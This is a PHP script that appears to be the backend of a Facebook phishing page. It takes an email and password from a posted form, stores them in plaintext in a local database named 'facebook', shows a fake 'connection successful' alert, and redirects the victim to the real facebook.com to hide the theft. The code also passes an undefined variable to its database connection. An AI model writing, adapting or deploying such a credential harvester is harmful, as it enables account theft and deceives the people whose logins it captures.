<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header("content-type: text/html; charset=utf-8");

$host = "localhost";
$username = "root";
$password = "";
$dbname = "facebook";

$conn = new mysqli($host, $user, $password, $dbname);

if ($conn->connect_error) {
    die("Echec de connexion : " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mail = $_POST["mail"];
    $password = $_POST["password"];

    $sql = "INSERT INTO users(mail, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $mail, $password);

    if ($stmt->execute()) {
        echo "<script>alert('Connexion réussie!'); window.location.href='https://www.facebook.com';</script>";
    } else {
        echo "<script>alert('Échec de connexion!');</script>";
    }

    $stmt->close();
    $conn->close();
}
?>